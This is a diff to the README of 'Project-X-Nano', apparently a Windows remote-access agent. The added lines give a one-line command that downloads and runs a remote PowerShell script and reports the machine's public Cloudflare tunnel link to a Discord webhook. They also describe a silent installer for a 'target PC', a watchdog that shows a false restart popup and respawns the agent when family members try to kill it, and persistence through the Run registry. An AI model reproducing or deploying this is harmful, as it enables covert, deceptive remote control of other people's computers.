@@ -21,13 +21,32 @@
 
 ## ⚡ 1-Line Universal Setup (Run on Any Windows PC)
 
-Open **PowerShell** and paste this single command to download, configure, and start Project-X-Nano automatically in the background:
+Deploy the full agent to any PC with a single command or double-click. It automatically downloads all core binaries from GitHub, starts the backend, generates an encrypted Cloudflare Tunnel, and uploads the public remote link to your central server / Discord webhook:
 
+### Method A: Single PowerShell Command
 ```powershell
-irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1 | iex
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1))) -ReportUrl "https://discord.com/api/webhooks/your/webhook"
 ```
+*(Leave out `-ReportUrl` if you only want local LAN access or automatic TryCloudflare forwarding)*
 
-> **Dashboard URL:** `http://localhost:8765` (or `http://<your-pc-ip>:8765` from phone)
+### Method B: Double-Click Batch Installer
+1. Download or copy `install_agent.bat` onto the target PC.
+2. Double-click **`install_agent.bat`**.
+3. It will prompt for your webhook/server URL (or press Enter to skip) and handle everything silently in the background!
+
+> **Local Dashboard:** `http://localhost:8765`  
+> **Public Cloudflare URL:** Generated automatically and written to `public_url.txt` + posted to your webhook!
+
+---
+
+## 🛡️ Anti-Tamper Watchdog & Self-Healing Integrity
+
+Built for durability on shared family PCs:
+- **Task Manager Kill Protection:** If a user or family member tries to end `Project-X-Nano` or `cloudflared` from Task Manager, a native system popup is displayed:  
+  `"You need to restart your PC to stop that exe."`  
+  and the background service is immediately re-spawned!
+- **Self-Healing Integrity Engine:** If critical files (`.exe`, `config.json`, `cloudflared.exe`) are deleted or tampered with, the agent detects the missing files and downloads fresh copies from the GitHub repository in parallel.
+- **Persistent Autostart:** Survives reboots via both the Windows Run registry and background watchdog monitoring.
 
 ---
 
@@ -113,7 +132,11 @@ If you ever need to completely remove Project-X-Nano from a machine:
 2. Click **`🗑️ Uninstall Project-X-Nano Remotely`**.
 3. It will wipe all startup registry keys, scheduled tasks, firewall rules, terminate the background server, and automatically purge all installation folders (`%LOCALAPPDATA%\Project-X-Nano`) with zero leftover trace.
 
-### Option B: Local 1-Line Command
+### Option B: Using `uninstall.bat`
+1. Double-click `uninstall.bat` in the installation directory.
+2. Type `Y` to confirm. It will signal the watchdog, stop all processes cleanly, remove registry keys, and wipe all local files.
+
+### Option C: Local 1-Line Command
 ```powershell
 powershell -Command "Stop-Process -Name Project-X-Nano -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Project-X-Nano' -ErrorAction SilentlyContinue; schtasks /Delete /TN 'Project-X-Nano' /F 2>$null; Remove-Item -Path \"$env:LOCALAPPDATA\Project-X-Nano\" -Recurse -Force -ErrorAction SilentlyContinue"
 ```
